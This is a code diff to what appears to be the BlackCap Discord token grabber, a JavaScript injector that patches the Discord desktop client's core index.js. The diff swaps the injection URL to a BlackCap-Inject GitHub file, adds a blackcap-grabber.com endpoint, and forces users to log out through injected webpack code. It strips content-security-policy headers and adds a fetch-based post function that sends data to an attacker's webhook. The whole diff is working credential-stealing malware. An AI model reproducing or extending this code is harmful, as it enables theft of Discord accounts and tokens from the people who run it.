@@ -27,8 +27,9 @@ const config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/furax124/Protectinject/index.js",
+    injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     webhook: "%WEBHOOK%",
+    UWUWED: "https://login.blackcap-grabber.com:3000/premium/",
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -74,6 +75,7 @@ function updateCheck() {
     const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
     const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
+    //if(config.nume_core === "%num_core_discord%")return;
     if(app === 'Lightcord')return;
     if(app === 'DiscordCanary')return;
     if(app === 'DiscordPTB')return;
@@ -99,6 +101,9 @@ function updateCheck() {
         const startUpScript = `const fs = require('fs'), https = require('https');
 const indexJS = '${indexJs}';
 const bdPath = '${bdPath}';
+
+
+
 const fileSize = fs.statSync(indexJS).size
 fs.readFileSync(indexJS, 'utf8', (err, data) => {
     if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
@@ -123,8 +128,8 @@ if (fs.existsSync(bdPath)) require(bdPath);`;
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
     }, 5000);
     }
-    if (!fs.existsSync(path.join(__dirname, "Protect"))) return !0;
-    execScript
+    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
+    execScript(
         `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
     );
     return !1;
@@ -146,9 +151,11 @@ function userclick() {
     waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
     waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
 }
+
 function IsSession(item) {
     return item?.innerText?.includes("Devices")
 }
+
 function handler(e) {
     e = e || window.event;
     var target = e.target || e.srcElement,
@@ -198,17 +205,58 @@ const hooker = async (content) => {
     req.end();
 };
 
-session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    delete details.responseHeaders['content-security-policy'];
-    delete details.responseHeaders['content-security-policy-report-only'];
 
-    callback({
-        responseHeaders: {
-            ...details.responseHeaders,
-            'Access-Control-Allow-Headers': "*"
+async function post(url, embed){
+    const window = BrowserWindow.getAllWindows()[0];
+    console.log(url + embed)
+    var b = await window.webContents.executeJavaScript(` 
+    fetch("${url}", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+mode: "no-cors",
+        body: JSON.stringify(${embed})
+    })`, !0)
+    return b
+}
+
+session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
+    if (details.url.startsWith(config.webhook)) {
+        if (details.url.includes("discord.com")) {
+            callback({
+                responseHeaders: Object.assign({
+                    'Access-Control-Allow-Headers': "*"
+                }, details.responseHeaders)
+            });
+        } else {
+            callback({
+                responseHeaders: Object.assign({
+                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
+                    'Access-Control-Allow-Headers': "*",
+                    "Access-Control-Allow-Origin": "*"
+                }, details.responseHeaders)
+            });
         }
-    })
+
+
+    } else {
+        delete details.responseHeaders['content-security-policy'];
+        delete details.responseHeaders['content-security-policy-report-only'];
+
+        callback({
+            responseHeaders: {
+                ...details.responseHeaders,
+                'Access-Control-Allow-Headers': "*"
+            }
+        })
+    }
+
 })
+
+
+
+
 
 async function FirstTime() {
     const window = BrowserWindow.getAllWindows()[0];
